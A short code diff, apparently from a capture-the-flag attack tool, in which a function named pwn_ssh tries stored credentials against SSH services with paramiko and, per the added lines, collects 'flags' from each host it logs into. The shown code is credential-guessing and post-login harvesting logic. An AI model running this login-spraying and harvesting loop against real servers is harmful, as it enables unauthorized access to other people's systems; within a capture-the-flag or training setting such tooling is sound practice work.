@@ -3,6 +3,7 @@ from typing import Tuple
 import paramiko
 
 from .credentials import credential_bag, flag_bag
+from .exploit import find_flags
 
 
 def _get_ssh_client():
@@ -21,6 +22,10 @@ def pwn_ssh(url: str, port: int, service) -> Tuple[str, bool, bool]:
                 ssh.connect(url, port=port, username=credential.username, password=credential)
                 credential.mark_works(service)
                 working.add(credential)
+
+                flags = find_flags(ssh)
+                for flag in flags:
+                    flag_bag.add_flag(service, flag)
         except:
             credential.mark_rejected(service)
             continue
